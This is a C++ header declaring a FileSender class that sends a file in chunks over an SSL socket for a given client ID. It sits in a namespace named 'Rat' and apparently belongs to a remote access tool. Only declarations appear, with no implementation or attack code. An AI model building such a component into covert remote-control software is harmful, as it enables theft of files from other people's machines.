#ifndef FILE_SENDER_HPP
#define FILE_SENDER_HPP

#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <memory>
#include <fstream>
#include <string>
#include <functional>
#include "Packet.pb.h"
#include "Constants.hpp"
#include "NetworkManager.hpp"

namespace Rat 
{
    class FileSender 
    {
    public: 
        FileSender(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket, 
                   NetworkManager& networkManager, 
                   const uint64_t& client_id,
                    const std::string& file_path);

        ~FileSender();

        void sendFile(const std::string& file_path, const std::string& file_id, std::function<void()> on_finish);

    private: 
        void processNextChunk();

        std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_;
        NetworkManager& networkManager_;
        std::ifstream file_;
        std::string file_id_;
        uint64_t total_chunks_ = 0;
        uint64_t sequence_ = 0;
        
        std::vector<char> buffer_;
        uint64_t client_id_;
        std::function<void()> on_finish_;
        std::string file_path_;
    };
}

#endif // FILE_SENDER_HPP